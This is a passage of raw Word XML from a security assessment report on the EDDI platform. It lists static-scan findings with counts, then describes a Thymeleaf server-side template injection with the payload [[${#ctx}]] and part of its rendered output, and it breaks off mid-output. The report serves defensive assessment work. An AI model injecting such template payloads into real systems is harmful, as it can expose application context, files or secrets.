          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The “Resource Injection” error indicates that a resource (such as a file, network connection, command, etc.) is dynamically determined using user input without valid validation or sanitization, which can lead to serious vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D883AC0" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Three were found in the scan, all with low criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="258F7C55" w14:textId="1703212C" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="36" w:name="_Toc200039274"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>System Information Leak</w:t>
      </w:r>
      <w:bookmarkEnd w:id="36"/>
    </w:p>
    <w:p w14:paraId="075BB791" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The “System Information Leak” error indicates that the code or application exposes internal system information-such as stack traces, exception details, file paths, class names, library versions, or other details that an attacker could exploit.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="487FB62C" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Only one with low criticality appears in the scan.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FD9FD89" w14:textId="6E1C507A" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="37" w:name="_Toc200039275"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>System Information Leak: Internal</w:t>
      </w:r>
      <w:bookmarkEnd w:id="37"/>
    </w:p>
    <w:p w14:paraId="2F8DCE49" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The “System Information Leak: Internal” error indicates that the application reveals internal system information to external users-particularly sensitive data that should never leave the backend environment.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="586866E6" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Five were found in the scan, all with low criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="135337A9" w14:textId="4F483AB3" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="38" w:name="_Toc200039276"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Unchecked Return Value</w:t>
      </w:r>
      <w:bookmarkEnd w:id="38"/>
    </w:p>
    <w:p w14:paraId="221B2A88" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The “Unchecked Return Value” error indicates that the code invokes a function/method that returns a value, but completely ignores that value, without checking or using it. This is considered bad style and potentially dangerous because it could hide errors or execution failures.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AD8FE52" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Four are found in the scan, all with low criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="160F9B81" w14:textId="2100D1E6" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="39" w:name="_Toc200039277"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Unreleased Resource: Streams</w:t>
      </w:r>
      <w:bookmarkEnd w:id="39"/>
    </w:p>
    <w:p w14:paraId="43A81A2B" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">The “Unreleased Resource: Streams” error indicates that a data stream (e.g., </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>InputStream</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>OutputStream</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>FileInputStream</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>BufferedReader</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, etc.) was opened but was never closed properly. This leads to resource leaks such as: unreleased files, open sockets, or unnecessarily consumed memory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D74025D" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Nine were found in the scan, all with high criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="619107BE" w14:textId="37813B79" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="40" w:name="_Toc200039278"/>
      <w:r w:rsidRPr="005432B6">
        <w:lastRenderedPageBreak/>
        <w:t>Weak Cryptographic Hash</w:t>
      </w:r>
      <w:bookmarkEnd w:id="40"/>
    </w:p>
    <w:p w14:paraId="7959649C" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>“Weak Cryptographic Hash” error indicates that you are using a hash algorithm that is considered weak or insecure, such as: MD5 or SHA-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1.These</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> algorithms are no longer secure for cryptographic purposes because they are vulnerable to collisions, that is, it is possible to generate two different inputs that produce the same hash. This undermines data integrity and can be exploited in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cyber attacks</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, especially when used for: Passwords, File verification, Session tokens or authentication.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E1BFE69" w14:textId="11E37057" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Only one with low criticality appears in the scan.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07459315" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:color w:val="000080"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="41" w:name="_dmgycg1x1539" w:colFirst="0" w:colLast="0"/>
      <w:bookmarkStart w:id="42" w:name="_7u2evvgjogwt" w:colFirst="0" w:colLast="0"/>
      <w:bookmarkEnd w:id="41"/>
      <w:bookmarkEnd w:id="42"/>
      <w:r w:rsidRPr="00930D36">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DDFC1A9" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="43" w:name="_Toc200039279"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Dynamic Code Analysis</w:t>
      </w:r>
      <w:bookmarkEnd w:id="43"/>
    </w:p>
    <w:p w14:paraId="3B811459" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">This section presents some vulnerability errors found by a dynamic code analysis (using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>BurpSuite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> or manually).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10B70806" w14:textId="77777777" w:rsidR="008A62CD" w:rsidRPr="008A62CD" w:rsidRDefault="008A62CD" w:rsidP="008A62CD">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:vanish/>
          <w:color w:val="000080"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BA95213" w14:textId="2912B0A4" w:rsidR="008A62CD" w:rsidRPr="008A62CD" w:rsidRDefault="008A62CD" w:rsidP="008A62CD">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:keepNext/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:spacing w:before="360" w:after="120"/>
        <w:contextualSpacing w:val="0"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:vanish/>
          <w:color w:val="000080"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="44" w:name="_Toc200039280"/>
      <w:bookmarkEnd w:id="44"/>
    </w:p>
    <w:p w14:paraId="2C8E0589" w14:textId="6BFCA0F0" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="008A62CD">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="45" w:name="_Toc200039281"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006940D4">
        <w:t>Server</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:t xml:space="preserve"> Side</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:t xml:space="preserve"> Template Injection (SSTI)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="45"/>
    </w:p>
    <w:p w14:paraId="370F914A" w14:textId="1875278B" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:spacing w:before="360" w:after="120"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>During the manual research session, there was one area in the EDDI interface where one can alter the outputs of a custom model by simply placing payloads into the config JSON (</w:t>
      </w:r>
      <w:r w:rsidR="003B5E47">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="003B5E47">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199858483 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="003B5E47">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="003B5E47">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00F8736B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00257ECB">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="003B5E47">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">): that is a genuine </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">SSTI </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(Server-Side Template Injection). In practice, after deploying the template, any unvalidated string ends up directly in the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Thymeleaf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> template engine used to generate responses, which renders the interface an "oracle" for testing malicious payloads (</w:t>
      </w:r>
      <w:r w:rsidR="00871FA9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00871FA9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199858677 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00871FA9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00871FA9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00871FA9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00257ECB">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="00871FA9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">). Although the attack is quite complex (as not all injected strings are recognized as valid commands by </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Thymeleaf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">), it is highly dangerous: a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cyberattacker</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> can exploit this vulnerability in order to execute arbitrary expressions, read system files, or obtain environment variables in the context of the application. The source of the issue is in the inability to sanitize </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Thymeleaf's</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> template rendering process: in fact, since no filtering or escaping of user input data has been performed, all text fields are "trusted," and this opens the door to possible code injections straight into the response rendering engine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66C12494" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">For example, by inserting the expression [[${#ctx}]] as payload, the attacker can cause the entire execution context within the template to “explode.” Below is the output returned by </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Thymeleaf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> when this injection is performed in the JSON configuration field of the custom model:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="542F5F3F" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005160E2" w:rsidRDefault="001A39A9" w:rsidP="005432B6">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>This is an SSTI: “{memory</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>={</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">current={actions=[CONVERSATION_START, welcome], output=[This is an SSTI: ”[[${#ctx}]]" !!!!!!!!, Guess what!!, There is a semester party happening at your campus in two weeks </w:t>
      </w:r>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>🎉</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, What do you think? Want to go? </w:t>
      </w:r>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>😁</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">], </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>quickReplies</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>=[</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>QuickReply</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>{value=‘no’, expressions=‘</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>semester_party</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no_go</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">)’, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>isDefault</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">=null}, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>QuickReply</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>{value=‘not sure’, expressions=‘</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>semester_party</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>maybe_go</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">)’, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>isDefault</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">=null}, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>QuickReply</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>{value=‘yes’, expressions=‘</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>semester_party</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(going)’, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
